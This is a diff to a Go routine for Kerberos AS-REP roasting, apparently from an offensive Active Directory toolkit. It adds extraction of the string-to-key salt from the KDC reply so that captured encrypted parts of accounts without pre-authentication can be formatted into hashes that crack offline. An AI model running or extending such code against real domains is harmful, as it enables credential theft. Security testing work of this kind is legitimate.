@@ -12,8 +12,8 @@ import (
 
 // ASREPRoastResult contains the raw fields extracted from an AS-REP response for an
 // account that does not require Kerberos pre-authentication (UF_DONT_REQUIRE_PREAUTH).
-// The caller is responsible for formatting CipherText into a crackable hash
-// (e.g. hashcat $krb5asrep$<etype>$<username>@<realm>:<first16>$<rest>).
+// The caller is responsible for formatting CipherText into a crackable hash, e.g.
+// with attacks.FormatASREPHashWithSalt.
 type ASREPRoastResult struct {
 	// Username is the account that was targeted.
 	Username string
@@ -23,6 +23,14 @@ type ASREPRoastResult struct {
 	EncryptionType int
 	// CipherText is the raw encrypted part of the AS-REP, crackable offline.
 	CipherText []byte
+	// Salt is the string-to-key salt of the key CipherText is encrypted under, as
+	// the KDC reports it in the AS-REP's PA-ETYPE-INFO2 (or PA-ETYPE-INFO). It is
+	// empty when the KDC sent none, in which case the default salt (upper-cased
+	// realm followed by the user name) applies. Computer accounts use
+	// "<REALM>host<name>.<realm>" instead, and AES keys of an account renamed
+	// after its password was set keep the old salt, so a hash built from the
+	// default would never crack.
+	Salt string
 }
 
 // buildASREPRoastReq constructs the pre-auth-less AS-REQ used by ASREPRoast: no
@@ -129,5 +137,30 @@ func asrepRoast(username, realm, kdcHost string, buildReq func(string, string) (
 		Realm:          realm,
 		EncryptionType: as_rep.EncPart.EType,
 		CipherText:     as_rep.EncPart.Cipher,
+		Salt:           asRepSalt(as_rep.PAData, as_rep.EncPart.EType),
 	}, nil
+}
+
+// asRepSalt returns the salt the AS-REP's PA-ETYPE-INFO2 (or legacy PA-ETYPE-INFO)
+// gives for etype, or "" when the reply carries none for it.
+func asRepSalt(padata []messages.PAData, etype int) string {
+	for _, pa := range padata {
+		switch pa.PADataType {
+		case messages.PAETypeInfo2:
+			var info messages.ETypeInfo2
+			if _, err := info.Unmarshal(pa.PADataValue); err == nil {
+				if _, salt, _, ok := matchETypeInfo(info, []int{etype}, ""); ok {
+					return salt
+				}
+			}
+		case messages.PAETypeInfo:
+			var legacy messages.ETypeInfo
+			if _, err := legacy.Unmarshal(pa.PADataValue); err == nil {
+				if _, salt, _, ok := matchETypeInfo(legacyETypeInfo2(legacy), []int{etype}, ""); ok {
+					return salt
+				}
+			}
+		}
+	}
+	return ""
 }
